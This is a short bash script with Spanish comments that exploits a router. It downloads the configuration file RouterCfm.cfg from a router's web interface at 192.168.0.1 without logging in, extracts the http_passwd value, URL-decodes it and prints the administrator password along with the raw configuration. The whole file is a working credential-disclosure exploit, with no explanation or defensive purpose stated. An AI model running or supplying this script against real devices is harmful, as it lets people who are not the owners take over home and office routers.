#!/bin/bash

# Función para enviar la solicitud a un router
function send_request {
    router_ip=$1
    url="/cgi-bin/DownloadCfg/RouterCfm.cfg"
    response=$(curl -s -G -H "Content-Type: application/json" --data-urlencode "url=$url" "http://192.168.0.1/$url")

    echo "$response"
}

# Función para obtener la contraseña desde la respuesta
function get_password_from_response {
    server_response=$1
    password=$(echo "$server_response" | grep -oP 'http_passwd=\K[^&]*' | sed 's/%\([0-9A-F][0-9A-F]\)/\\x\1/g; s/+/ /g' | xargs -0 printf '%b')

    echo "$password"
}

ROUTER_IP="192.168.0.1"
SERVER_RESPONSE=$(send_request "$ROUTER_IP")
DECODED_PASSWORD=$(get_password_from_response "$SERVER_RESPONSE")

echo "Password - $DECODED_PASSWORD"
echo $SERVER_RESPONSE
